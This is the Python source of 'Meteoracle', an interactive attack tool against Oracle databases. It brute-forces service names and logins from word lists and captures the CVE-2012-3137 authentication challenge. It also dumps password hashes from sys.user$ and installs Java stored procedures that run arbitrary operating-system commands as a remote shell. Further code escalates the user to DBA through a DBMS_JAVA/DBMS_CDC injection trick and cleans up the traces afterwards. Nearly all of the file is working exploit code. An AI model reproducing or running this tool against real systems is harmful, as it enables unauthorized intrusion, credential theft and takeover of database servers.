#!/usr/bin/python

import cx_Oracle
import rlcompleter,readline
import sys
import re
import cve20123137

COMMANDS = ['sysdba', 'options','service', 'version', 'sql', 'cmd', 'hashdump', 'capabilities', 'connect', 'allhashes', 'user', 'SID','getchallenge','getprivs', 'getversion','clean','put','get','ls', 'cp', 'mount', 'fdisk', 'df', 'cat', 'grep', 'bg', 'bind', 'break', 'cd', 'command', 'compgen', 'complete', 'continue', 'declare', 'dirs', 'disown', 'echo', 'enable', 'eval', 'exec', 'exit', 'export', 'fc', 'fg', 'getops', 'hash', 'help', 'history', 'jobs', 'kill', 'let', 'local', 'logout', 'popd', 'printf', 'pushd', 'pwd', 'read', 'readonly', 'return', 'set', 'shift', 'shopt', 'source', 'suspend', 'test', 'times', 'trap', 'type', 'typset', 'ulimit', 'umask', 'unalias', 'unset', 'wait', 'password']

def complete(text, state):
    for cmd in COMMANDS:
        if cmd.startswith(text):
            if not state:
                return cmd
            else:
                state -= 1
readline.parse_and_bind("tab: complete")
readline.set_completer(complete)

def services(host):
	sid = open("sid.txt", "r")
	port=raw_input("Port (default 1521)? ").strip(' ')
	if port=='':
		port=1521
	for line in sid:
		try:
			conn = cx_Oracle.connect('meteoruser/meteoruser@'+host+':'+str(port)+'/'+line)
		except cx_Oracle.DatabaseError as e:
			error, = e
			if error.code == 1017:
				print "Valid service : "+line
			elif error.code == 12541:
				print "server or port unreachable"
				break
			continue
	sid.close()

def challenge(host):
	user=raw_input("User : ").strip(' ')
	port=raw_input("Port (default 1521)? ").strip(' ')
	service=raw_input("Service : ").strip(' ')
	if port=='':
		port=1521
	cve20123137.connect(user, service, host, port, False)
	
def users(host):
	service = raw_input("Service to test # ")
	print "[ ] Trying to find valid users with service "+service
	print "[ ] be careful with account lock ?"
	#user = open("users_test.txt","r")
	user = open("userpass.txt","r")
	port=raw_input("Port (default 1521)? ").strip(' ')
	if port=='':
		port=1521
	for u in user:
		#password = open("default.txt", "r")
		#for p in password:
		#	try:
		#		conn = cx_Oracle.connect(u+'/'+p+'@'+host+'/'+service)
		#		print "Account found : "+u+":"+p
		#	except cx_Oracle.DatabaseError as e:
		#		error, = e
		#		print "nop, trying another "+u+":"+p+" "+str(error.code)
		#		pass
		for up in user:
			try:
				conn = cx_Oracle.connect(up+'@'+host+':'+str(port)+'/'+service)
				print "Account found : "+up
			except cx_Oracle.DatabaseError as e:
				error, = e
				if error.code != 1017:
					if error.code == 28000:
						print "Account Locked : "+ up.strip()
					elif error.code == 9275:
						print "CONNECT INTERNAL is not a valid DBA connection "+up.strip()
					elif error.code == 12541:
						print "server or port unreachable"
						break
					else:
						print "nop, trying another "+up+" "+str(error.code)
				pass

		#password.close()

def processPath(cmd, pwd):
	if cmd[0] != '/':
		if pwd != '/':
			cmd = pwd + '/' + cmd	
		else:
			cmd = pwd + cmd
	while '/./' in cmd:
		cmd=cmd.replace('/./','/')
	if re.search(r"..$",cmd) is not None:
		cmd=cmd+'/'
	while '/../' in cmd:
		tab=cmd.split('/')
		idx=tab.index('..')
		if idx==0:
			tab[0:idx+1]=[]
		else:
			tab[idx-1:idx+1]=[]
		cmd='/'.join(tab)
		if cmd=='':
			cmd='/'
		if cmd[0] != '/':
			cmd = '/'+cmd
		if cmd=='/':
			break
	while '//' in cmd:
		cmd=cmd.replace('//','/')
	if len(cmd) > 1 and cmd[-1] =='/':
		cmd=cmd[:-1]
	if cmd=='' or cmd=='/.':
		cmd='/'
	
	return cmd

#def write_file(name):



class connect:
	def __init__(self):
		self.conn=""
		self.java1=False #javacmd with 1 argument
		self.javaproc1=False #proc for java with 1 argument
		self.java2=False #javacmd with 3 arguments
		self.javaproc2=False # proc for java with 3 arguments
		self.javagrant=False
		self.tmpexec=False
		self.tmpdir=False
		self.elevate=False

	def begin(self, host):
		self.user=""
		self.password=""
		self.sid=""
		self.conn=""
		self.auth=""
		self.port=str(1521)
		self.sysdba=False
		try:
			f=open("sqlconnect.txt", "r")
			self.user=f.readline().strip()
			self.password=f.readline().strip()
			self.sid=f.readline().strip()
			self.sdba=f.readline().strip()
			self.port=f.readline().strip()
			f.close()
		except IOError:
			pass	
		while True:
			cmd = raw_input("Meteor/connect> ").strip(' ')
			if cmd == "help":
				print "commands : options, user, password, service, sysdba, save, port, go"	
			elif cmd == "options":	
				print "	User : " + self.user
				print "	Password : " + self.password
				print "	service : " + self.sid	
				print "	Sysdba : " + str(self.sysdba)
				print "	Port : " + str(self.port)
			elif cmd == "user":	
				self.user=raw_input("User# ").strip(' ')
			elif cmd == "password":	
				self.password=raw_input("Password# ").strip(' ')
			elif cmd == "service":	
				self.sid=raw_input("service# ").strip(' ')
			elif cmd == "sysdba":
				self.sysdba = not self.sysdba
				print " Sysdba => "+str(self.sysdba)
			elif cmd == "port":
				self.port = raw_input("port# ").strip(' ')
			elif cmd =="save":
				f = open("sqlconnect.txt", "w")
				f.write(self.user+"\n")
				f.write(self.password+"\n")
				f.write(self.sid+"\n")
				f.write(str(self.sysdba)+"\n")
				f.write(str(self.port)+"\n")
				f.close()
			elif cmd == "go":	
				print "[ ] Connection"
				if self.sid == "":
					print "Error : service not set"
					continue
				try:
					auth = self.user+'/'+self.password+'@'+host+':'+self.port+'/'+self.sid
					if self.sysdba:
						self.conn = cx_Oracle.connect(auth, mode=cx_Oracle.SYSDBA)
					else:
						self.conn = cx_Oracle.connect(auth)
					return True
				except cx_Oracle.DatabaseError as e:
					error, = e
					if error.code == 1017:
						print "invalid username/password"
					elif error.code ==1005:
						print "null password given; logon denied"
					elif error.code == 28009:
						print "connection as SYS should be as SYSDBA or SYSOPER"
					elif error.code == 1031:
						print "insufficient privileges"
					elif error.code == 12541:
						print "server or port unreachable"
					elif error.code == 12514:
						print "service unknown"
					else:
						print "error Oracle : "+str(error.code)
			elif cmd == "exit":
				self.conn= ""
				return False
			else:
				print "commands : options, user, password, service, sysdba, save, port, go"	
	def connected(self):
		if self.conn != "":
			return True
		else:
			return False
	def getconnection(self):
		return self.conn
	def getversion(self):
		return self.conn.version

	def sql(self):
		while True:
			nbline=1;
			parse=True
			nofunc=True
			sql = raw_input("SQL> ").strip(' ')
			dot=sql[-1:]
			if sql=="exit":
				return
			if sql=="":
				continue
			if dot==';':
				sql=sql[0:-1]
			else:
				while True:
					nbline=nbline+1
					sql+= ' '+raw_input(str(nbline)+ " > ").strip(' ')
					dot=sql[-1]
					if "create" in sql and ("procedure" in sql or "function" in sql):
						nofunc=False
					if dot=='/' and not nofunc:
						sql=sql[0:-1]
						parse=False
						break
					if dot ==';' and nofunc:
						sql=sql[0:-1]
						break
						
			cursor = self.conn.cursor()
			try:
				explodesql = sql.strip(' ').split(' ')
				if explodesql[0] == 'exec':
					cursor.callproc(' '.join(explodesql[1:]))
					parse=False
				else:
					cursor.execute(sql)
			except cx_Oracle.DatabaseError as e:
				error, = e.args
				print "SQL error : ", error
				continue
			try:
				if parse:
					for line in cursor:
						li=line
						for i in li:
							print i,
						print ""
				else:
					parse=True
			except cx_Oracle.InterfaceError as e:
				error, = e.args
				print "Error : "+error
				pass

	def hashdump(self):
		sql = "select name, password from sys.user$"
		cursor = self.conn.cursor()
		try:
			cursor.execute(sql)
		except cx_Oracle.DatabaseError as e:
			error, = e.args
			print "SQL error : ", error
		for line in cursor:
			li=line
			if li[1] is not None:
				print li[0]+":"+li[1]

	def getdba(self):
		sql = "select grantee from dba_role_privs where granted_role='DBA'"
		cursor = self.conn.cursor()
		try:
			cursor.execute(sql)
		except cx_Oracle.DatabaseError as e:
			error, = e.args
			print "SQL error : ", error
		for line in cursor:
			li=line
			if li[0] is not None:
				print li[0]

	def launchinsh(self, cmd, curs):
		sqldir = "create or replace directory TMP as '/tmp'"
		sql="create or replace procedure FILE_WRITE_MO"
		sql+=" IS fic utl_file.file_type; "
		sql+="begin "
		sql+="fic := utl_file.fopen('TMP', 'exec_MO.sh', 'W'); "
		sql+="utl_file.put_line(fic, '#!/bin/sh'); "
		sql+="utl_file.put_line(fic, '"+cmd+"'); "
		sql+="utl_file.fclose(fic); "
		sql+="end; "
		curs.execute(sqldir)
		curs.execute(sql)
		curs.callproc('FILE_WRITE_MO')
		self.tmpdir=True;
		self.tmpexec=True;
		return "/bin/sh /tmp/exec_MO.sh"

	def shell(self):
		print "[*] Starting shell"
		getjavasimple = 'CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED "JAVACMDSIMPLE" AS '
		getjavasimple += 'import java.lang.*; '
		getjavasimple  += 'import java.io.*; '
		getjavasimple  += 'import java.util.*; '
		getjavasimple  += 'public class JAVACMDSIMPLE {  '
		getjavasimple  += 'public static String execCommand (String command) throws IOException { '
		getjavasimple  += 'Process process;'
		getjavasimple  += 'try{'
		getjavasimple  += 'process = Runtime.getRuntime().exec(command); '
		getjavasimple  += '} catch (IOException e) { return "command not found or security restriction : " + command; }'
		getjavasimple  += 'InputStream br= process.getInputStream(); '
		getjavasimple  += 'DataInputStream in = new DataInputStream(process.getInputStream()); '
		getjavasimple  += 'DataInputStream err = new DataInputStream(process.getErrorStream()); '
		getjavasimple  += 'BufferedReader bin  = new BufferedReader(new InputStreamReader(in)); '
		getjavasimple  += 'BufferedReader berr  = new BufferedReader(new InputStreamReader(err)); '
		getjavasimple  += 'String line = null; '
		getjavasimple  += 'String out = new String(); '
		getjavasimple  += 'while ((line = bin.readLine())  != null ){ out+=line + "\\n";} '
		getjavasimple  += 'while ((line = berr.readLine()) != null) { out+=line+"\\n"; } '
		getjavasimple  += 'bin.close();'
		getjavasimple  += 'berr.close();'
		getjavasimple  += 'process.destroy();'
		getjavasimple  += 'try{ process.waitFor();} catch (InterruptedException e){}'
		getjavasimple  += 'return out; } } '
		
		procgetjavasimple= "CREATE OR REPLACE FUNCTION JAVACMDSIMPLEFUNC (p_command IN VARCHAR2) RETURN VARCHAR2 "
		procgetjavasimple+= "AS LANGUAGE JAVA NAME 'JAVACMDSIMPLE.execCommand (java.lang.String) "
		procgetjavasimple+= "return java.lang.String'; "

		cursor = self.conn.cursor()
		try: 
			print "[ ] Try to create Java function"
			cursor.execute(getjavasimple)
			print "[*] Java function"
			self.java1=True
		except:
			pass
		try:	
			print "[ ] Try to create oracle function"
			cursor.execute(procgetjavasimple)
			print "[*] Oracle function"
			self.javaproc1=True
		except:
			pass
		home=""
		who=""
		try:
			who = cursor.execute("select javacmdsimplefunc('whoami') from dual").fetchone()[0].strip('\n')
			home = cursor.execute("select javacmdsimplefunc('pwd') from dual").fetchone()[0].strip('\n')
		except cx_Oracle.DatabaseError as e:
			error, = e.args
			if error.code ==29532:
				cursor.callproc("dbms_java.grant_permission",[ self.user.upper(), "SYS:java.io.FilePermission", "<<ALL FILES>>", "execute" ])
				self.javagrant=True
				try:
					who = cursor.execute("select javacmdsimplefunc('whoami') from dual").fetchone()[0].strip('\n')
					home = cursor.execute("select javacmdsimplefunc('pwd') from dual").fetchone()[0].strip('\n')
				except:
					if error.code ==29532:
						print "User is not allowed to use Java"
						return
		pwd = home
		try:
			pwdless = pwd.split('/')[-2]+'/'+pwd.split('/')[-1]
		except IndexError as e:
			print pwd.split(':')[0]
			return

		javacmd = 'CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED "JAVACMD" AS '
		javacmd += 'import java.lang.*; '
		javacmd += 'import java.io.*; '
		javacmd += 'import java.util.*; '
		javacmd += 'public class JAVACMD {  '
		#javacmd += 'public static String execCommand (String command, String dir, Integer substr) throws IOException { '
		javacmd += 'public static String execCommand (String command, String dir, int substr) throws IOException { '
		javacmd += 'String[] envp = {"PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin", "TERM=xterm"};'
		javacmd += 'Process process;'
		javacmd += 'try{'
		javacmd += 'process = Runtime.getRuntime().exec(command , envp, new File(dir)); '
		javacmd += '} catch (IOException e) { return "command not found or security restriction : " + command; }'
		javacmd += 'InputStream br= process.getInputStream(); '
		javacmd += 'DataInputStream in = new DataInputStream(process.getInputStream()); '
		javacmd += 'DataInputStream err = new DataInputStream(process.getErrorStream()); '
		javacmd += 'BufferedReader bin  = new BufferedReader(new InputStreamReader(in)); '
		javacmd += 'BufferedReader berr  = new BufferedReader(new InputStreamReader(err)); '
		javacmd += 'String line = null; '
		javacmd += 'String out = new String(); '
		javacmd += 'while ((line = bin.readLine())  != null ){ out+=line + "\\n";} '
		javacmd += 'while ((line = berr.readLine()) != null) { out+=line+"\\n"; } '
		javacmd += 'bin.close();'
		javacmd += 'berr.close();'
		javacmd += 'process.destroy();'
		javacmd += 'try{ process.waitFor();} catch (InterruptedException e){}'
		javacmd += 'if (substr!=0)'
		javacmd += 'out = out.substring(substr);'
		javacmd += 'if (out.length() > 4000)'
		javacmd += 'return out.substring(0,4000);'
		javacmd += 'return out; } } '

		proccmd= "CREATE OR REPLACE FUNCTION JAVACMDFUNC (p_command IN VARCHAR2, p_dir IN VARCHAR2, num IN NUMBER) RETURN VARCHAR2 "
		proccmd+= "AS LANGUAGE JAVA NAME 'JAVACMD.execCommand (java.lang.String, java.lang.String, int) "
		#proccmd+= "AS LANGUAGE JAVA NAME 'JAVACMD.execCommand (java.lang.String, java.lang.String, java.lang.Integer) "
		proccmd+= "return VARCHAR2'; "

		try:
			cursor.execute(javacmd)
			self.java2=True
		except:
			pass
		try:
			cursor.execute(proccmd)
			self.javaproc2=True
		except:
			pass
		while True:
			cmd = raw_input(who+":"+pwdless+ " #> ")
			if cmd == "exit":
				return
			explodecmd = cmd.strip(' ').split(' ')
			if explodecmd[0] == '':
				continue
			if explodecmd[0] == 'ls':
				cmd=cmd.replace('ls', 'ls -C --color') #need to test in case of sunOs, ...
				#cmd=cmd.replace('ls', 'ls -C')
			if explodecmd[0] == 'cd':
				if len(explodecmd) > 1:
					tmp = processPath(explodecmd[1].strip(' '),pwd)
					sqlcd="select javacmdsimplefunc('cd "+tmp+"') from dual"
					cursor.execute(sqlcd);
					for line in cursor:
						li=line
						#print li[0]
						if li[0] is None or 'basename' in li[0]:
							pwd=tmp
						else:
							print "No such file or directory or security restriction."
				else:
					pwd = home
				if len(pwd) > 2:
					pwdless = pwd.split('/')[-2]+'/'+pwd.split('/')[-1]
				else:
					pwdless = pwd.split('/')[-1]
				continue

			try:
				cmd = cmd.replace('\'', '\\\'')
				if '>' in cmd or '|' in cmd:
					cmd = self.launchinsh(cmd, cursor)
				sql3 = "select javacmdfunc('" + cmd + "', '" + pwd +"', 0) from dual"
				#print sql3
				cursor.execute(sql3)
			except cx_Oracle.DatabaseError as e:
				error, = e.args
				print "SQL error : ", error.code
				continue
			size=0
			for line in cursor:
				li=line
				if li[0] is not None:
					size += len(li[0])
					sys.stdout.write(li[0].strip('\n'))
				else:
					break
			sub=0
			while size ^ 4000 == 0:
				sub=sub+4000
				sql3 = "select javacmdfunc('" + cmd + "', '" + pwd +"', "+ str(sub) +") from dual"
				cursor.execute(sql3)
				size = 0
				for line in cursor:
					li=line
					size += len(li[0])
					if li[0] is not None:
						tmp = li[0].strip('\n')
						#print tmp,
						sys.stdout.write(tmp)
			print ''

	def clean(self):
		cursor=self.conn.cursor()
		if self.tmpexec:
			sql="select javacmdsimplefunc('rm /tmp/exec_MO.sh') from dual"
			cursor.execute(sql)
			self.tmpexec=False
		if self.java1:
			sql="drop java source javacmdsimple"
			cursor.execute(sql)
			self.java1=False
		if self.java2:
			sql="drop java source JAVACMD"
			cursor.execute(sql)
			self.java2=False
		if self.javaproc1:
			sql="drop function javacmdsimplefunc"
			cursor.execute(sql)
			self.javaproc1=False
		if self.javaproc2:
			sql="drop function JAVACMDFUNC"
			cursor.execute(sql)
			self.javaproc2=False
		if self.tmpdir:
			sql="drop directory TMP"
			cursor.execute(sql)
			self.tmpdir=False
		if self.javagrant:
			cursor.callproc("dbms_java.revoke_permission",[ self.user.upper(), "SYS:java.io.FilePermission", "<<ALL FILES>>", "execute" ])
			self.javagrant=False
		if self.elevate:
			sql="revoke dba from "+self.user
			cursor.execute(sql)
			self.elevate=False

	def getprivs(self):
		cursor=self.conn.cursor()
		sql = "select count(grantee) from dba_role_privs where granted_role='DBA' and grantee='"+self.user.upper()+"'"
		cursor.execute(sql)
		for line in cursor:
			li=line
			num = li[0]
		if num == 1:
			print "current user is already DBA"
			return
		sql="SELECT DBMS_JAVA.SET_OUTPUT_TO_JAVA('ID','oracle/aurora/rdbms/DbmsJava','SYS'"
		sql+=",'writeOutputToFile','TEXT', NULL, NULL, NULL,NULL,0,1,1,1,1,0,'DECLARE PRAGMA "
		sql+="AUTONOMOUS_TRANSACTION; BEGIN EXECUTE IMMEDIATE ''GRANT DBA TO "+ self.user
		sql+=" WITH ADMIN OPTION''; END;', 'BEGIN NULL; END;') from dual"
		cursor.execute(sql)
		sql="EXEC DBMS_CDC_ISUBSCRIBE.INT_PURGE_WINDOW('NO_SUCH_SUBSCRIPTION',SYSDATE)"
		try:
			cursor.callproc('DBMS_CDC_ISUBSCRIBE.INT_PURGE_WINDOW', ['NO_SUCH_SUBSCRIPTION','SYSDATE'])
		except:
			pass
		sql="BEGIN DBMS_CDC_ISUBSCRIBE.INT_PURGE_WINDOW('NO_SUCH_SUBSCRIPTION',SYSDATE); END;"
		try:
			cursor.execute(sql)
		except:
			pass
		sql = "select count(grantee) from dba_role_privs where granted_role='DBA' and grantee='"+self.user.upper()+"'"
		cursor.execute(sql)
		for line in cursor:
			li=line
			num = li[0]
		if num ==1:
			print self.user.upper()+" is a new DBA"
			self.elevate=True
		else:
			print "fail to get privs"	

def version():
	print "Meteoracle version 0.1"

def help():
	print "sql : SQL shell"
	print "cmd : OS command line"
	print "version : print version"
	print "connect : connexion"
	print "hashdump"
	#print "allhashes"
	print "users : search users"
	print "services : search services/SID"
	print "getchallenge : dump challenge attack (cve 2012-3137)"
	print "getversion : print Oracle version"
	print "getdba : obtain user list with dba role"
	print "clean : clean system"
	print "getprivs : privilege escalation"
	#print "put <file> : copy file from local to remote"
	#print "get <file> : copy file from remote to local"
	#print "capabilities : print capabilities in oracle"
	print "exit : quit meteoracle"
	return


if __name__ == u'__main__':

	host=""
	try:
		host = sys.argv[1]
	except IndexError:
		print("Usage : python meteoracle.py [<ip/host>]")
		exit()

	print "MeteOracle"
	print "To make the rain and the nice weather with Oracle Database"
	c=connect()

	while True:
		cmd = raw_input("Meteor> ").strip(' ')

		if cmd in ['sql', 'cmd', 'hashdump', 'getversion', 'getdba', 'clean', 'getprivs'] and not c.connected():
			print "[ ] Not connected to any database"
			continue
		if cmd == "help":
			help()
		elif cmd == "sql":
			c.sql()
		elif cmd == "cmd":
			c.shell()
		elif cmd == "exit":
			if c.connected():	
				c.clean()
				exit()
			else:
				exit()
		elif cmd == "hashdump":
			c.hashdump()
		elif cmd == "version":
			version()
		elif cmd == "services":
			services(host)
		elif cmd == "users":
			users(host)
		elif cmd == "connect":
			if c.begin(host):
				print "[*] Connected to "
				print "Oracle database version "+c.getversion()
			connection = c.getconnection()
		elif cmd == "getchallenge":
			challenge(host)
		elif cmd == "getversion":
			print "Oracle database version "+c.getversion()
		elif cmd == "getdba":
			c.getdba()
		elif cmd == "clean":
			c.clean()
		elif cmd == "getprivs":
			c.getprivs()
		else:
			print "bad command"	

